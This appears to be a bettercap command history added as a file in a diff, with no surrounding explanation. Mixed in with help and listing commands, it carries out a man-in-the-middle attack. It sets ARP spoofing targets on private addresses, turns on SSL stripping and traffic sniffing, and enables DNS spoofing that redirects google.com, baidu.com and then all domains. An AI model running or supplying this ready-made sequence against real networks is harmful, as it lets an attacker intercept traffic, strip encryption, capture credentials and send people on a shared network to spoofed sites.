@@ -1,0 +1,47 @@
+clear 
+net.show
+caplets.show 
+caplets.update 
+ls
+help
+caplets.
+help
+net.show
+caplets.show 
+help
+active 
+get *
+help iface
+help ui 
+alias MAC shane
+alias 
+get $
+get https.server.path 
+get *
+net.sniff on
+net.show 
+get net.sniff.*
+help
+set http.proxy.sslstrip true
+set net.sniff.verbose false
+set arp.spoof.targets 192.168.1.6
+arp.spoof on
+http.proxy on
+net.sniff on
+set dns.spoof.domains google.com
+set https.proxy.sslstrip true
+set net.sniff.verbose false
+set arp.spoof.targets 10.211.55.7
+arp.spoof on
+http.proxy on
+help
+net.sniff on
+help
+help arp.spoof 
+set dns.spoof.domains baidu.com
+set dns.spoof.address bing.cn
+set dns.spoof.all true
+dns.spoof on
+help dns.spoof 
+set dns.spoof.address 192.168.1.1
+dns.spoof on
